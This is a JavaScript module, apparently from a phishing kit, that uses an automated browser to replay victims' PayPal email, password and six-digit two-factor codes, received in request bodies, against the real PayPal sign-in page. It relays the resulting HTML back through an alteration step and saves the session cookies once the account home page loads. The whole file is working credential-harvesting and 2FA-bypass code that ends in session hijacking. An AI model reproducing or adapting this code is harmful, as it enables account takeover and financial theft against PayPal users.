const { cout } = require("../../../utils/server-helpers")
const { Application } = require("../../Application")

class SpikeApplication extends Application {
    async runBeforeResponse(page) {
        try {
            if (this.email.length > 0) {
                let email = `[name="login_email"]`
                await page.waitForSelector(email)
                let clearInputs = [email]
                for (let i = 0; i < clearInputs.length; i++) {
                    await page.focus(clearInputs[i])
                    await page.keyboard.down('Control')
                    await page.keyboard.press('A')
                    await page.keyboard.up('Control')
                    await page.keyboard.press('Backspace')
                }

                await page.type(email, this.email)
            }
        } catch (error) { }
    }

    saveBeforeResponse(html) {
        const pos = [
            ["Home", "PayPal balance", "Activity"]
        ]

        for (let cPos of pos) {
            let match = 0
            for (const i of cPos) {
                if (html.includes(i)) match += 1
            }

            if (match == cPos.length) return true
        }

        return false
    }

    async postRequest(body) {
        try {
            const page = await this.connectBrowser()
            await page.setExtraHTTPHeaders({
                "User-Agent": this.useragent
            })

            const spikeType = body["spikeType"]

            console.log(body);
            if (spikeType == "home-login") {
                let email = `[name="login_email"]`
                let password = `[name="login_password"]`
                await page.waitForSelector(email)
                let clearInputs = [email, password]
                for (let i = 0; i < clearInputs.length; i++) {
                    await page.focus(clearInputs[i])
                    await page.keyboard.down('Control')
                    await page.keyboard.press('A')
                    await page.keyboard.up('Control')
                    await page.keyboard.press('Backspace')
                }

                await page.type(email, body.login_email)
                let ifPassword = false
                if (body.login_password.length > 0) {
                    ifPassword = true
                    await page.waitForSelector(password)
                    await page.type(password, body.login_password)
                    await page.click(`[id="btnLogin"]`)
                } else {
                    await page.evaluate(() => {
                        document.querySelector(`[name="login_email"]`).setAttribute("spike-email-done", "true")
                    })

                    await page.click("#btnNext")
                }

                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "xhr" || response.request().resourceType() == "fetch") {
                        if (response.url().startsWith("https://www.paypal.com/signin")) {
                            await new Promise(re => setTimeout(re, 1000))
                            return true
                        }
                    }
                })

                if (ifPassword) {
                    await page.waitForNavigation({ waitUntil: "networkidle0" })
                }
            } else if (spikeType == "home-password") {
                let password = `[name="login_password"]`
                await page.waitForSelector(password)
                await page.type(password, body.login_password)
                await page.click(`[id="btnLogin"]`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "otp-code") {
                await page.evaluate(() => {
                    let codeInput = document.querySelectorAll(`[type="number"]`)
                    codeInput.forEach((value, index) => {
                        value.setAttribute("spike-otp-box", index)
                    })
                })

                for (let i = 0; i < 6; i++) {
                    await page.waitForSelector(`[spike-otp-box="${i}"]`)
                    await page.type(`[spike-otp-box="${i}"]`, body.otpCode[i])
                }

                await page.click(`[type="submit"]`)
                let resResult = false
                try {
                    await page.waitForResponse(async response => {
                        if (response.request().resourceType() == "xhr" || response.request().resourceType() == "fetch") {
                            if (response.url().includes("twofactor")) {
                                const contentType = response.headers()["content-type"]
                                if (contentType && contentType.includes("application/json")) {
                                    const data = await response.json()
                                    if (!data.hasOwnProperty("submissionError")) {
                                        resResult = true
                                    }
                                }

                                await new Promise(re => setTimeout(re, 3500))
                                return true
                            }
                        }
                    })
                } catch (error) { }

                if (resResult) await page.waitForNavigation({ waitUntil: 'networkidle0' })
            }

            else {
                return await this.getRequest()
            }

            const html = this.alterHTML(await page.content())
            if (this.saveBeforeResponse(html)) return await this.saveCookies()

            return html
        } catch (error) {
            cout.err(error);
            return await this.getRequest()
        }
    }
}

module.exports = { SpikeApplication }